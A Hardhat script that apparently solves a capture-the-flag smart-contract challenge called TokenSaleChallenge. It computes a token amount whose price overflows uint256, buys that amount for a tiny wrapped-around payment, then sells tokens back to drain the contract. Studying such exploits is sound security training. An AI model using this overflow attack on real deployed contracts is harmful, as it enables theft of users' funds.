const { ethers } = require('hardhat');
const { BigNumber } = ethers;

const CHALLENGE_ADDRESS = '0xb7A3A984233f885784a3637770966Ce49B33C9a7';

const MAX_UINT256 = BigNumber.from(2).pow(256);
const ONE_ETH = BigNumber.from(10).pow(18);

async function main() {
  const TokenSaleChallenge = await ethers.getContractFactory('TokenSaleChallenge');
  const contract = await TokenSaleChallenge.attach(CHALLENGE_ADDRESS);

  const numTokens = MAX_UINT256.sub(1).div(ONE_ETH).add(3);
  console.log(`Final amount of tokens in the contract: ${numTokens}`);

  const wei = ethers.utils.formatUnits(numTokens.mul(ONE_ETH).mod(MAX_UINT256), 'wei');
  console.log(`Sending ${ethers.utils.formatEther(wei)}`);
  await contract.buy(numTokens, { value: wei });

  await contract.sell(3);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
